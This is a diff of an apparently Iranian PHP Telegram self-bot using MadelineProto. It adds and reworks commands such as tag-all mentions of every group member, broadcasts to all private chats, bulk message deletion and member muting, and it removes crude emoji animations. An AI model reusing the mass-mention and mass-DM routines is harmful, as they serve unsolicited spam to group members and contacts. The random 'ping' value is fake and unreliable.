-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💙🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-💙💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💙      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-💙🧡💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍💙💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💙
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      💙
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💜💙
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💙🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-💙💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💙      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-💙🧡💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍💙💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💙
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      💙
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💜💙
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💙🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-💙💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💙      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-💙🧡💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍💙💛
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💙
-💚      🤎
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      💙
-❤️💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💜💙
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-❤️💙🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-🤍🧡💛
-💚      🤎
-💙💜🖤
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-❤️💙🧡
-🤎 ♡ 🤍
-🖤💜💚
-"]);
-}
-//----------------------------------------------
-if($text=='ساک' or $text=='suck'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "🗣 <====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣==="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣=="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣==="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣===="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "🗣<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "<====="]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "💦💦<====="]);
-
-}
-//----------------------------------------------
-if($text=='bk' or $text=='بکیرم'){
-$bot = [
-"😕",
-"🙁",
-"😁",
-"😐",
-"😐",
-"😍",
-"😈",
-];
-$r = $bot[rand(0, count($bot)-1)];
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-$r$r$r
-$r         $r
-$r           $r
-$r        $r
-$r$r$r
-$r         $r
-$r           $r
-$r           $r
-$r        $r
-$r$r$r
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "
-$r         $r
-$r       $r
-$r     $r
-$r   $r
-$r$r
-$r   $r
-$r      $r
-$r        $r
-$r          $r
-$r            $r
-"]);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id,'message' => "
-$r$r$r          $r         $r
-$r         $r      $r       $r
-$r           $r    $r     $r
-$r        $r       $r   $r
-$r$r$r          $r$r
-$r         $r      $r   $r
-$r           $r    $r      $r
-$r           $r    $r        $r
-$r        $r       $r          $r
-$r$r$r          $r            $r
-"]);
-    
-}
-//-------------------- End Of Fun ---------------------
-//================ Enemy Tools ================
-// Del
+//End Of Fun
+//Enemy Tools
+//Del
 if($text == 'delenemy' or $text == '/delenemy' or $text == '!delenemy'  or $text == 'حذف انمی'){
 if($type3 == 'supergroup' or $type3 == 'chat'){
       $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
@@ -2324,19 +1182,22 @@ file_put_contents("data.json", json_encode($data));
      }
  //============== Ping ==============
 if ($text == 'ping' or $text == 'Ping' or $text == 'ربات' or $text == ' Robot' or $text == 'رباا' or $text == 'bot' or $text == 'Bot') {
-$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "☬Your Bot Is Online☬ devby:[֍Mohammad֍](https://T.me/needu_b)"
-,'disable_web_page_preview'=>true
+$bor = [
+"1s",
+"0.1s",
+"0.2s",
+"0.3s",
+"0.4s",
+"0.5s",
+"0.6s",
+"0.7s",
+"0.8s",
+"0.9s",
+"1.5s",];
+$r = $bor[rand(0, count($bor)-1)];
+$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ping: $r"
 ,'reply_to_msg_id' => $msg_id]);
-
   }
-    if($text == 'ربات'){
-       yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» Cole sᴇʟғ ɪs ᴏɴʟɪɴᴇ !"]);
-    }
-//================ Restart ==================
-       if($text == 'tagof' or $text == 'ریستارت'){
-           yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» tag process stoped !"]);
-            $MadelineProto->restart();
-       }
 //================ Usage ==================
     if ($text == 'مصرف'  or $text == 'usage'){
        $mem_using = round(memory_get_usage() / 1024 / 1024,1);
@@ -2363,7 +1224,6 @@ $game = $data['game'];
 $voice = $data['voice'];
 $video = $data['video'];
 $mem_using = round(memory_get_usage() / 1024 / 1024,1);
-$load = sys_getloadavg();
 $status = "
 =-=-=-=-=-=-=-=-=-=-=
 » sᴛᴀᴛᴜs ɪs : 
@@ -2372,6 +1232,7 @@ $status = "
 » ʙᴏʟᴅ ᴍᴏᴅᴇ : `$boldmode`
 » ᴛɪᴍᴇ ɴᴀᴍᴇ : `$timename`
 » Bio Mod : `$BioMod`
+» Tagger : `$tagger`
 » ɪᴛᴀʟɪᴄ ᴍᴏᴅᴇ : `$italicmode`
 » ᴄᴏᴅɪɴɢ ᴍᴏᴅᴇ : `$codingmode`
 » ᴅᴇʟᴇᴛᴇᴅ ᴍᴏᴅᴇ : `$deletedmode`
@@ -2393,16 +1254,14 @@ $MadelineProto->messages->sendMessage(['peer' => $peer,
  'parse_mode' => 'MarkDown','reply_to_msg_id' => $message['id']]);
 }}
 //================ User Founder ================
-if(preg_match("/^[\/\#\!]?(tag) (.*)$/i", $text)){
-    preg_match("/^[\/\#\!]?(tag) (.*)$/i", $text, $m);
+if(preg_match("/^[\/\#\!]?(taag) (.*)$/i", $text)){
+    preg_match("/^[\/\#\!]?(taag) (.*)$/i", $text, $m);
 $link = $m[2];
 yield $MadelineProto->messages->editMessage(['peer' => $peer,
 'id' => $msg_id,
-'message' => "» [جوین شو لدفا](tg://user?id=$link) !",
+'message' => "» [pekh](tg://user?id=$link) !",
 'parse_mode'=>'MarkDown']);
-
 }
-
 //============== Upload ==============
 if(preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text)){
 preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text, $a);
@@ -2434,18 +1293,13 @@ yield $MadelineProto->messages->sendMedia([
  'parse_mode' => 'Markdown'
 ]);
 $t=time()-$oldtime;
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "✅ Uploaded ($t".'s)']);
+yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => " Uploaded ($t".'s)']);
 unlink("files/$filename");
 } else {
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '⚠️ خطا : حجم فایل بیشتر 150MB است!']);
 }
 }
 
-if ($text == '/die;') {
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '!..!']);
-  yield $this->restart();
-  die;
-}
 //============== Part Mode ==============
 if($partmode == "on"){
 if($update){
@@ -2457,6 +1311,18 @@ for ($T = 1; $T <= mb_strlen($text); $T++) {
               }
 }
 }}
+if(preg_match("/^[\/\#\!]?(beshmar) (.*)$/i", $text)){
+preg_match("/^[\/\#\!]?(beshmar) (.*)$/i", $text, $m);
+$q = $m[2];
+$res_search = yield $MadelineProto->messages->search(['peer' => $peer, 'q' => $q, 'filter' => ['_' => 'inputMessagesFilterEmpty'], 'min_date' => 0, 'max_date' => time(), 'offset_id' => 0, 'add_offset' => 0, 'limit' => 50, 'max_id' => $message['id'], 'min_id' => 1]);
+$texts_count = count($res_search['messages']);
+$users_count = count($res_search['users']);
+yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "این تعداد رو دیدم: $texts_count \nاز طرف ایشون $users_count"]);
+foreach($res_search['messages'] as $text){
+$textid = $text['id'];
+yield $MadelineProto->messages->forwardMessages(['from_peer' => $text, 'to_peer' => $peer, 'id' => [$textid]]);
+ }
+}
 //============== Reverse Mode ==============
 if($reversemode == "on"){
 if($update){
@@ -2493,22 +1359,23 @@ if($update){
 
 }
 }}
-//================== tagaller =====================
- if (preg_match("/^[\/\#\!]?(OkTagStarted)(.*)$/i", $text)) {
-     $chat = yield $this->getPwrChat($peer);
-     $chats = $chat['participants'];
+//tager
+  if (preg_match("/^[\/\#\!]?(Tag)(.*)$/i", $text)){ 
+    preg_match("/^[\/\#\!]?(Tag) (.*)$/i", $text, $m);
+              $chat = yield $this->getPwrChat($peer);
+              $chats = $chat['participants'];
      while (sizeof($chats) >= 1) {
           $spl = $chats;
           $Safa = false;
           $chats = array_splice($spl, 1);
           foreach ($spl as $number => $up) {
               $id = $up['user']['id'];
-              $Safa .= "[🍁🌸🍁](tg://user?id=$id) " . Join☔;
-              sleep(9);
+              $Safa .= "[$m[2]](tg://user?id=$id) " ;
+              sleep(4);
           }
           yield $this->messages->sendMessage([
                'peer' => $peer,
-               'message' => "Mohammad☬ \n$Safa ",
+               'message' => "Mohammad☬ [$Safa] ",
                'parse_mode' => 'Markdown'
           ]);
      }
@@ -2516,7 +1383,7 @@ if($update){
      foreach ($chats as $number => $up) {
          $id = $up['user']['id'];
          if ($up['user']['type'] == "user")
-               $Safa .= "-[🍁🌸🍁](tg://user?id=$id) " . Join☔;
+               $Safa .= "-[$m[2]](tg://user?id=$id) " ;
       }
       yield $this->messages->sendMessage([
            'peer' => $peer,
@@ -2524,7 +1391,7 @@ if($update){
            'parse_mode' => 'Markdown'
       ]);
       return;
-} 
+}
 //============== UnderLine Mode ==============
 if($underlinemode == "on"){
 if($update){
@@ -2642,7 +1509,7 @@ yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, '
 preg_match("/^[\/\#\!]?(echo) (on|off)$/i", $text, $m);
 $data['echo'] = $m[2];
 file_put_contents("data.json", json_encode($data));
-      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ꏂꏳꀍꂦ N҉o҉w҉ I̸ $m[2]"]);
+      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "echo now $m[2]"]);
      }
 if($message && $data['echo'] == "on"){
 
@@ -2650,19 +1517,12 @@ yield $MadelineProto->messages->forwardMessages(['from_peer' => $peer, 'to_peer'
 
      }
 //=========== markread ===========
- if(preg_match("/^[\/\#\!]?(markread on)$/i", $text)){
-   $Conf = json_decode(file_get_contents('Config.json'));
-$Conf->Markread = 1;
-file_put_contents('Config.json', json_encode($Conf));
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>'☬Markreading turned **ON** ✅ ', 'parse_mode' => 'MarkDown' ]);
-}
-//--
-if(preg_match("/^[\/\#\!]?(markread off)$/i", $text)){
- $Conf = json_decode(file_get_contents('Config.json'));
-$Conf->Markread = 0;
-file_put_contents('Config.json', json_encode($Conf));
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>'☬Markreading turned **OFF**  ❌', 'parse_mode' => 'MarkDown' ]);
-}
+ if(preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text)){
+preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text, $m);
+   $data['markread'] = $m[2];
+file_put_contents("data.json", json_encode($data));
+      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "markread is $m[2]"]);
+     }
 //===
 if ((int)json_decode(file_get_contents('Config.json'))->Markread == 1) {
 $msg_id = $update['update']['message']['id'];
@@ -2692,82 +1552,63 @@ if($text == '/id' or $text == 'id'){
   yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ʏᴏᴜʀ ɪᴅ : `$messag`", 'parse_mode' => 'markdown']);
 } else {
 	if($type3 == 'user'){
- yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ʏᴏᴜʀ ɪᴅ : `$peer`", 'parse_mode' => 'markdown']);
+ yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ɪᴅ : `$peer`", 'parse_mode' => 'markdown']);
 }}} else {
   yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ɢʀᴏᴜᴘ ɪᴅ : `$peer`", 'parse_mode' => 'markdown']);
 }
 }
-//============== Translate ==============
-if(preg_match("/^[\/\#\!]?(trn) ([a-z]+) ([a-z]+) (.*)$/i", $text)){
-
-preg_match("/^[\/\#\!]?(trn) ([a-z]+) ([a-z]+) (.*)$/i", $text, $m);
-
-$from =$m[2];
-$to =$m[3];
-$txt =$m[4];
-yield $MadelineProto->messages->editMessage(['peer' => $peer,
-'id' => $msg_id,
-'message' => "» ʏᴏᴜʀ sᴛʀɪɴɢ ғᴏʀ ᴛʀᴀɴsʟᴀᴛᴇ : ( `$txt` ) from » ( `$from` ) to » ( `$to` )",
-'parse_mode'=>"MarkDown"]);
-yield $MadelineProto->messages->sendMessage(['peer' =>"@AQUARVIS_Bot", 'message' => 
-"ترجمهه $from $to $txt", ]);
-file_put_contents("msgid2444.txt",$msg_id);
-file_put_contents("peer444.txt","$peer");
-}
 //====== calc =======
-if(preg_match("/^[\/\#\!]?(calc) (.*)$/i", $msg)){
-preg_match("/^[\/\#\!]?(calc) (.*)$/i", $msg, $text);
-$txxxt = $text[2];
-$messages_BotResults = $MadelineProto->messages->getInlineBotResults(['bot' => "@MACLBot", 'peer' => $chatID, 'query' => $txxxt, 'offset' => '0', ]);
-$query_id = $messages_BotResults['query_id'];
-$query_res_id = $messages_BotResults['results'][0]['id'];
-$MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id", ]);
-}
-//====== najva ========
-if(strpos($msg,"hidden ") !== false){
-$ip = trim(str_replace("/hidden ","",$msg));
-$ip = explode("|",$ip."|||||");
-$txxt = trim($ip[0]);
-$answeer = trim($ip[1]);
-$messages_BotResults = $MadelineProto->messages->getInlineBotResults(['bot' => "@nnbbot", 'peer' => $chatID, 'query' => "$txxt $answeer", 'offset' => '0', ]);
-$query_id = $messages_BotResults['query_id'];
-$query_res_id = $messages_BotResults['results'][0]['id'];
-$MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id", ]);
-}
+ if (preg_match("/^[\/\#\!]?(calc) (.*)$/i", $text)) {
+     preg_match("/^[\/\#\!]?(calc) (.*)$/i", $text, $m);
+     $txxt = $m[2];
+     $messages_BotResults = $MadelineProto->messages->getInlineBotResults(['bot' => "@MACLBot", 'peer' => $chatID, 'query' => $txxt, 'offset' => '0',]);
+     $query_id = $messages_BotResults['query_id'];
+     $query_res_id = $messages_BotResults['results'][0]['id'];
+     $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id",]);
+ }
+//==========
+ if (preg_match("/^[\/\#\!]?(short) (.*)$/i", $text)) {
+     preg_match("/^[\/\#\!]?(short) (.*)$/i", $text, $m);
+     $txxxt = $m[2];
+     $messages_BotResults = $MadelineProto->messages->getInlineBotResults(['bot' => "@ylinkpro_bot", 'peer' => $chatID, 'query' => $txxxt, 'offset' => '0',]);
+     $query_id = $messages_BotResults['query_id'];
+     $query_res_id = $messages_BotResults['results'][0]['id'];
+     $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id",]);
+ }
 //========pin and unpin =============
-if($msg =="سنجاق" || $msg=="pin" || $msg=="/pin" || $msg=="!pin"){
-$repid = $update['update']['message']['reply_to_msg_id'];
-if(isset($update['update']['message']['reply_to_msg_id'])){
-$type = $MadelineProto->get_info($chatID);
-$typ = $type['type'];
-$Updates = $MadelineProto->channels->updatePinnedMessage(['silent' => false, 'channel' => $chatID, 'id' => $repid, ]);
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>" ☬Pinned✅",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
+    if($text == 'unpin' or $text == 'حذف سنجاق'){
+$MadelineProto->channels->updatePinnedMessage(['silent' => false, 'channel' => $chatID, 'id' => 0,]);
+yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => "ᴜɴᴘɪɴɴᴇᴅ", 'reply_to_msg_id' => $msg_id, 'parse_mode' => 'MarkDown']);
+     }
+if($text == 'pin' ){
+if (isset($update['update']['message']['reply_to_msg_id'])) {
+    $type = $MadelineProto->get_info($chatID);
+    $Updates = $MadelineProto->channels->updatePinnedMessage(['silent' => false, 'channel' => $chatID, 'id' => $msg_id,]);
+    yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => " ᴘɪɴɴᴇᴅ", 'reply_to_msg_id' => $msg_id, 'parse_mode' => 'MarkDown']);
 }
+     }
+//==========
+if ($text == "rem") {
+if (isset($update['update']['message']['reply_to_msg_id'])) {
+    $pv = $MadelineProto->messages->getHistory(['peer' => $chatID, 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => $msg_id, 'max_id' => 0, 'min_id' => 0, 'hash' => 0]);
+    foreach ($pv['messages'] as $text) {
+        $MadelineProto->messages->deleteMessages([
+   'revoke' => 'Bool',
+   'peer' => $chatID,
+   'id' => [$text['id']]
+        ]);
+    }
 }
-if($msg =="سنجاق" || $msg=="pin" || $msg=="/pin" || $msg=="!pin"){
-$repid = $update['update']['message']['reply_to_msg_id'];
-if(isset($update['update']['message']['reply_to_msg_id'])){
-$type = $MadelineProto->get_info($chatID);
-$typ = $type['type'];
-$Updates = $MadelineProto->channels->updatePinnedMessage(['silent' => false, 'channel' => $chatID, 'id' => $repid, ]);
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>" ☬Pinned✅",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
-}
-}
-//--
-if($msg =="حذف سنجاق" || $msg=="unPin" || $msg=="/unpin" || $msg=="!unpin"){
-$MadelineProto->channels->updatePinnedMessage(['silent' => false, 'channel' => $chatID, 'id' => 0, ]);
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>" ☬UnPinned❌",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
-}
-
+     }
 //============ profile ===========
 if(strpos($text,"profile ") !== false){
-$ip = trim(str_replace("profile ","",$msg));
+$ip = trim(str_replace("profile ","",$m));
 $ip = explode("|",$ip."|||||");
 $id1 = trim($ip[0]);
 $id2 = trim($ip[1]);
 $id3 = trim($ip[2]);
 $User = $MadelineProto->account->updateProfile(['first_name' => "$id1", 'last_name' => "$id2", 'about' => "$id3", ]);
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id ,'message' =>"
+yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id ,'message' =>"
  **☬First Name** : `$id1`
 
 **☬Last Name** : `$id2`
@@ -2805,6 +1646,27 @@ yield $MadelineProto->channels->deleteMessages([
 ]);
 }
 }}
+//======clean
+elseif(preg_match("/^[\/\#\!]?(clean) ([0-9]+)$/i", $text) && $chID['type'] == 'supergroup'){
+    preg_match("/^[\/\#\!]?(clean) ([0-9]+)$/i", $text, $tet);
+  if($tet[2] >= 1 && $tet[2] <= 10000){
+                        $tet[2] = (int)$tet[2];
+                        $clean = (int)($tet[2]/1);
+                        for($i=1;$i<=$clean;$i++){
+                            $msgid = [];
+                            $pv = yield $this->messages->getHistory(['peer' => $peer, 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 1, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
+  foreach($pv['messages'] as $message){
+                                $msgid[] = $message['id'];
+                            }
+         yield $this->channels->deleteMessages(['revoke'=>true,'channel' => $peer,'id' => $msgid]);
+                        }
+                        $txt = ' تعداد '.$tet[2].' پیام با موفقیت حذف شد!';
+                    }
+    else {
+                        $txt = ' عدد نادرست یک عدد بین 1 تا 10,000 ارسال کنید!';
+                    }
+                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt,'reply_to_msg_id' => $msg_id, 'parse_mode' => 'markdown']);
+                }
 //================ Fall ================
 if($text == "fal" or $text == "fall" or $text == "فال"){
     if($type3 == "supergroup"||$type3 == "chat"||$type3 == 'user'){
@@ -2814,7 +1676,32 @@ $inputMediaPhotoExternal = ['_' => 'inputMediaPhotoExternal', 'url' => $add];
 $MadelineProto->messages->sendMedia(['peer' => $peer, 'media' => $inputMediaPhotoExternal ,'reply_to_msg_id' => $msg_id,'message' => "» ʏᴏᴜʀ ᴏᴍᴇɴ ʜᴀғᴇᴢ ɪs ʀᴇᴀᴅʏ =)"]);
 }
 }
-
+//========f2pv=======
+if ($text == 'F2pv' or $text == 'f2pv') {
+$rid =  $update['update']['message']['reply_to_msg_id'];
+$dialogs = $MadelineProto->get_dialogs();
+foreach ($dialogs as $peer) {
+$type = $MadelineProto->get_info($peer);
+$type3 = $type['type'];
+if($type3 == "user" ){
+ $MadelineProto->messages->forwardMessages(['from_peer' => $chatID, 'to_peer' => $peer, 'id' => [$rid], ]); 
+}
+}
+$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'فروارد همگانی با موفقیت به پیوی ها ارسال شد👌🏻','parse_mode' => "markdown"]);
+}
+if(preg_match("/^(s2pv) (.*)$/", $text)){
+preg_match("/^(s2pv) (.*)$/", $text, $m);
+$text = $m[2];
+$dialogs = $MadelineProto->get_dialogs();
+foreach ($dialogs as $peer) {
+$type = $MadelineProto->get_info($peer);
+$type3 = $type['type'];
+if($type3 == "user"){
+$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"$text"]); 
+}
+}
+$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'ارسال همگانی با موفقیت به پیوی ها ارسال شد👌🏻','parse_mode' => "markdown"]);			
+}
 //================ Meaning ================
 if(preg_match('~^معنی (.+)~s',$text,$match) and $match=$match[1] or preg_match('~^meane (.+)~s',$text,$match) and $match=$match[1]) {
     if($type3 == "supergroup"||$type3 == "chat"||$type3 == 'user'){
@@ -2831,21 +1718,6 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "» �
 ]);
 }
 }}
-//=====banandunban=====
-if($msg =="بن" || $msg =="مسدود" || $msg =="/ban" || $msg =="!ban" || $msg =="ban" || $msg =="اخراج"){
-if(isset($update['update']['message']['reply_to_msg_id'])){
-$gmsg = $MadelineProto->channels->getMessages(['channel' => $chatID, 'id' => [$update["update"]["message"]["reply_to_msg_id"]]]);
-$reply_from_id = $gmsg['messages'][0]['from_id'];
-if($reply_from_id !== false){
-$channelBannedRights = ['_' => 'channelBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'until_date' => 0];
-$MadelineProto->channels->editBanned(['channel' => $chatID, 'user_id' => $reply_from_id, 'banned_rights' => $channelBannedRights, ]);
-$meee = $MadelineProto->get_full_info($reply_from_id);
-$meeee = $meee['User'];
-$first_name1 = $meeee['first_name'];
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>"**User**: $reply_from_id **☬Banned**❗️️",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
-}
-}
-}
 //================ Git Hub ================
  if(preg_match("/^[\/\#\!]?(git) (.*)$/i", $text)){
 preg_match("/^[\/\#\!]?(git) (.*)$/i", $text, $m);
@@ -2893,6 +1765,162 @@ if($type3 == 'supergroup' or $type3 == 'chat'){
     }
     }
     }
+//BAN AND UNBAN
+if(preg_match("/^[\/\#\!]?(setvip) (.*)$/i", $text)){
+   preg_match("/^[\/\#\!]?(setvip) (.*)$/i", $text, $m);
+          $query = $m[2];
+          $time = date("H:i:s");
+       if($type3 == 'supergroup' or $type3 == 'chat'){
+         $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+         $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
+          $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+          $messag = $gms['messages'][0]['from_id'];
+          $mes = "\n کاربر $messag  \n دلیل :$query\n┾┈┅┅━━━━━━┅┅┈┾\n";
+                    file_put_contents('list/vip.txt', $mes,FILE_APPEND);
+          $vip = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => false, 'embed_links' => false, 'send_polls' => false, 'change_info' => true, 'invite_users' => false, 'pin_messages' => false, 'until_date' => 999999];
+    $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' =>   $messag, 'banned_rights' => $vip, ]);
+    $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+       کاربر ↢ $messag 
+       در ساعت ↢ $time 
+       به دلیل ↢ $query 
+       در لیست ویژه ها قرار گرفت 😎
+       "]);
+    }
+  }
+if(preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text)){
+   preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text, $m);
+       $query = $m[2];
+    if($type3 == 'supergroup' or $type3 == 'chat'){
+       $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+       $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
